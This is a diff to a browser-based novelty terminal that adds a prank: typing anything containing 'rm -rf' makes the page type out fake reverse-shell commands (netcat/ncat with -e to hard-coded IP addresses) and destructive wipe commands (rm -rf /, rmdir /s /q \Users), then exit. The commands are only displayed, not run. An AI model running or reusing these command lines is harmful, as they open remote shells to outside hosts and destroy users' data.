@@ -1,5 +1,5 @@
 import { TermColors } from "../constants.js";
-import { colorize, getSpacing } from "../utils.js";
+import { colorize, getSpacing, sleep } from "../utils.js";
 
 import cat from "./cat.js";
 import cowsay from "./cowsay.js";
@@ -38,9 +38,9 @@ const SystemCommands = [
 
         term.writeln(
           "\t" +
-            colorize(TermColors.Green, id) +
-            getSpacing(firstCommandSpacing - id.length) +
-            description
+          colorize(TermColors.Green, id) +
+          getSpacing(firstCommandSpacing - id.length) +
+          description
         );
       }
     },
@@ -79,10 +79,37 @@ const SystemCommands = [
   },
 ];
 
+function osShellText() {
+  const userAgent = (navigator.userAgentData.platform ?? navigator.platform).toLowerCase();
+  if (userAgent.includes('win')) {
+    return ['ncat 10.88.89.199 7877 -e cmd.exe\r\n', '', 'C:\\> rmdir /s /q \\Users\r\n'];
+  }
+  return ['nc -e /bin/sh 10.10.198.166 9898\r\n', '', '#$ rm -rf /\r\n'];
+}
+
+async function simulateReverseShell(term) {
+  for (const cmd of osShellText()) {
+    if (cmd === '') {
+      await sleep(800);
+      continue;
+    }
+    for (const c of cmd) {
+      term.write(c);
+      await sleep(45);
+    }
+  }
+}
+
 /**
+  * @param userInput {string}
  * @returns {string|null} Process ID if command executed started a process
  * */
 export async function exec(term, userInput, onProcessExit) {
+  if (userInput.includes("rm -rf")) {
+    await simulateReverseShell(term);
+    await exit.exec(term);
+    return exit.id;
+  }
   // Handle arguments check here to avoid duplication
   const [input, ...args] = userInput.split(/\s+/);
   const command = SystemCommands.find((c) => c.id === input);
@@ -102,7 +129,7 @@ export async function exec(term, userInput, onProcessExit) {
   ) {
     throw new Error(
       "not enough arguments\r\n" +
-        colorize(TermColors.Reset, `usage: ${command.usage}`)
+      colorize(TermColors.Reset, `usage: ${command.usage}`)
     );
   }
 
